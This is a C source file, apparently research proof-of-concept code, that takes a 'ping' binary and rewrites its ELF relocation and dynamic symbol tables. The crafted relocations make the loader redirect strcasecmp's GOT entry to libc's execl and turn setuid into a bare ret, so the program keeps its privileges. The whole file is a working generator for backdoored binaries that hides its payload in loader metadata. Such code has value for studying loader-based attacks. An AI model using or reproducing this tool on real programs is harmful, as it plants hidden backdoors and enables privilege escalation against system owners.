/* Copyright (c) 2012 Rebecca (bx) Shapiro

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.
*/
#define _GNU_SOURCE         /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include "elf_bf_utils.h"
#include "reloc.h"
#include "symtab.h"

#define OUTPUT_FILE "ping"
#define NUM_RELOC 9
#define RET 0xc3

// returns the location of a ret in the text segment
eresi_Addr find_ret_loc(f)
{
  // look at text segment, search for byte value c3
  elfshsect_t *text, *init, *plt;
  eresi_Addr offset;
  unsigned char *data;
  eresi_Addr sz, i;
  text =  elfsh_get_section_by_name(f,".text", NULL, NULL, NULL);

  data = (char *) text->data;
  sz = elfsh_get_section_size(text->shdr);

  for (i = 0; i < sz; i++) {
    if (RET == data[i]) {
      return i + text->shdr->sh_addr;
    }
  }
  return -1;
}

elfsh_Sym * get_sym_from_relplt_ent(f, r)
{
  elfshsect_t *pltrel, *symtab, *strtab;
  pltrel =  elfsh_get_section_by_name(f,".rela.plt", NULL, NULL, NULL);

  // lookup symbol table
  symtab = elfsh_get_section_by_index(f, elfsh_get_section_link(pltrel->shdr), NULL, NULL);

  // lookup strtab
  strtab = elfsh_get_section_by_index(f, elfsh_get_section_link(symtab->shdr), NULL, NULL);

  // get symbol
  elfsh_Sym *table;
  table = (elfsh_Sym *) symtab->data;

  return elfsh_get_symbol_by_index(table, elfsh_get_relsym(r));
}
char *get_symname_from_relplt_ent(f, r)
{
  elfsh_Sym *sym;
  elfshsect_t *pltrel, *symtab, *strtab;
  pltrel =  elfsh_get_section_by_name(f,".rela.plt", NULL, NULL, NULL);

  // lookup symbol table
  symtab = elfsh_get_section_by_index(f, elfsh_get_section_link(pltrel->shdr), NULL, NULL);

  // lookup strtab
  strtab = elfsh_get_section_by_index(f, elfsh_get_section_link(symtab->shdr), NULL, NULL);

  sym = get_sym_from_relplt_ent(f, r);
  eresi_Addr nameidx = sym->st_name;
  return  (char *) (strtab->data + nameidx);
}

// we have to implemt this ourselves becasuse eresi's version asumes we have rel entries (not rela)
elfsh_Rela *find_relplt_ent_by_name(elfshobj_t *f, char *name)
{
  elfshsect_t *pltrel =  elfsh_get_section_by_name(f,".rela.plt", NULL, NULL, NULL);
  // lookup num of relents in section
  eresi_Addr numrel = elfsh_get_section_size(pltrel->shdr)/sizeof(elfsh_Rela);
  elfsh_Rela *r, *table;
  int i;
  char *cmpname;
  table = (elfsh_Rela *) pltrel->data;
  for (i = 0; i < numrel; i++) {
    //look at each entry
    r = &(table[i]);
    cmpname = get_symname_from_relplt_ent(f, r);
    if(strcmp(name, cmpname) == 0){
      return r;
    }
  }
  return NULL;
}


eresi_Addr get_execl_offset(char *libc)
{
  elfshobj_t *f;
  elfsh_Rela *r;
  elfsh_Sym *s;
  int i;
  char *cmpname;
  f = elfutils_read_elf_file(libc);

  elfshsect_t *dynsym, *strtab;
  dynsym =  elfsh_get_section_by_name(f,".dynsym", NULL, NULL, NULL);

  // lookup strtab
  strtab = elfsh_get_section_by_index(f, elfsh_get_section_link(dynsym->shdr), NULL, NULL);

  // get symbol
  elfsh_Sym *table;
  table = (elfsh_Sym *) dynsym->data;
  eresi_Addr numsym = elfsh_get_section_size(dynsym->shdr)/sizeof(elfsh_Sym);

  char *strs = strtab->data;

  for (i = 0; i < numsym; i++) {
    //look at each entry
    s = &(table[i]);
    cmpname = strs + s->st_name;
    if(strcmp("execl", cmpname) == 0){
      return s->st_value;
    }
  }
  return 0;
}

int main(int argv, char *argc[])
{
  elfshsect_t *newrel, *dynsym, *dynrel, *bss, *newsym, *pltrel;
  char *reladyndata;
  elf_bf_link_map_t l;
  elf_bf_Sym got;
  eresi_Addr sz, ret;
  //elf_bf_Rela r[NUM_RELOC];
  eresi_Addr i;
  char *input, *output, *libc;

  if (argv != 4) {
    fprintf(stderr, "revieved %d args, usage: %s <original ping> <output name> <path to libc>\n", argv, argc[0]);
    exit(-1);
  } else {
    input = argc[1];
    output = argc[2];
    libc = argc[3];
    printf("input: %s\noutput: %s\nlibc: %s\n", input, output, libc);
  }

  l.lm_f = elfutils_read_elf_file(input);

  // Read PLTGOT value from dynamic table
  elfsh_Dyn *dyn;
  eresi_Addr pltgot;
  dyn = elfsh_get_dynamic_entry_by_type(l.lm_f, DT_PLTGOT);
  pltgot = elfsh_get_dynentry_val(dyn);
  printf("pltgot: %x\n", pltgot);
  // find relent for strcasecmp
  elfsh_Rela *strcasecmp = NULL;
  strcasecmp = find_relplt_ent_by_name(l.lm_f, "strcasecmp");
  printf ("reloffset: %x\n", elfsh_get_reloffset(strcasecmp));


  // find relent for setuid
  elfsh_Rela *setuid = NULL;
  setuid = find_relplt_ent_by_name(l.lm_f, "setuid");
  printf ("reloffset: %x\n", elfsh_get_reloffset(setuid));

  //get current dynsym
  dynsym = elfsh_get_section_by_name(l.lm_f,".dynsym", NULL, NULL, NULL);
  sz = elfsh_get_section_size(dynsym->shdr);

  //make a copy of this dynsym table so it is in writable memory
  newsym = insert_symtab_sec(l.lm_f, sz/sizeof(Elf64_Sym), elfsh_get_section_link(dynsym->shdr));
  elfsh_set_section_type(dynsym->shdr,ELFSH_SECTION_DYNSYM);
  memcpy(newsym->data, dynsym->data, sz);
  l.lm_sym = newsym;

  //fix dynamic table to use new sym table
  fixup_dynamic_sym(l.lm_f, elfsh_get_section_addr(newsym->shdr), elfsh_get_section_size(newsym->shdr));



  // get a copy of the existing reloc table
  dynrel = elfsh_get_section_by_name(l.lm_f,".rela.dyn", NULL, NULL, NULL);
  sz = elfsh_get_section_size(dynrel->shdr);
  eresi_Addr nextrel = sz/sizeof(Elf64_Rela);
  printf("rel sz: %d, numrel %d\n", sz, nextrel);
  newrel = insert_reloc_sec(l.lm_f, nextrel + NUM_RELOC, newsym);
  l.lm_reloc = newrel;
  l.lm_allocated = 1;
  l.lm_next_reloc = nextrel;


  symtab_get_sym(&l, 0, &got);
  symtab_set_sym(&got, 8, pltgot + 8, STT_FUNC); //PLTGOT + 0x8  =0x610ff0

  // fix dynamic table to use new reloc section
  fixup_dynamic_rela(l.lm_f, elfsh_get_section_addr(newrel->shdr), elfsh_get_section_size(newrel->shdr));

  // insert interesting relocation entries, copy over old entries
  memcpy(newrel->data, dynrel->data, sz);

  // find base address of libary
  set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
  set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location

  set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
  set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location

  set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get link_map addr
  set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get laddr

  printf("&execve: %x\n", get_execl_offset(libc));

  ret = find_ret_loc(l.lm_f); // find a location of a ret instruction in ping's binary
  printf("Found a ret at %x\n", ret);
  set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_execl_offset(libc));//adds offset of execl to libc base addr, stores in symbol's value

  set_next_reloc(&l, R_X86_64_64, got.index, elfsh_get_reloffset(strcasecmp), 0); //copies symbol value (base address of glibc+offset execl) into strcasecmp's got entry

  set_next_reloc(&l, R_X86_64_RELATIVE, got.index, elfsh_get_reloffset(setuid), ret); // retq, (so setuid isn't run), written into setuid's got entry

  elfutils_save_elf_file(l.lm_f, output);

  return 0;
}
